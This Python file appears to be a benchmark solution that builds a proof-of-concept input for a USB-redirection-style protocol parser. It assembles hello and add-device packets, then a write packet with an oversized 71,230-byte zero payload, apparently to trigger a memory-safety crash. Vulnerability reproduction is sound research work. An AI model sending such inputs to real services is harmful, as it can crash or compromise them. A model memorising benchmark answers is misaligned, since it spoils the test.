import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        def generate_hello():
            caps = [1, 2, 4, 8, 16, 32, 64, 128]
            caplen = len(caps) * 4
            body = struct.pack('>BBHI', 0x80, 0x00, 2, caplen)
            for cap in caps:
                body += struct.pack('>I', cap)
            pkt_len = len(body)
            header = struct.pack('>I', pkt_len)
            return header + body

        def generate_add_device():
            bus = 1
            devno = 1
            nstrings = 0
            body = struct.pack('>BBHHB', 0x82, 0x00, bus, devno, nstrings)
            pkt_len = len(body)
            header = struct.pack('>I', pkt_len)
            return header + body

        def generate_write(device, ep, data):
            dlen = len(data)
            body = struct.pack('>BBHIB', 0x01, 0x00, device, ep, dlen) + data
            pkt_len = len(body)
            header = struct.pack('>I', pkt_len)
            return header + body

        hello = generate_hello()
        add = generate_add_device()
        data = b'\x00' * 71230
        write_pkt = generate_write(0, 0x01, data)
        poc = hello + add + write_pkt
        return poc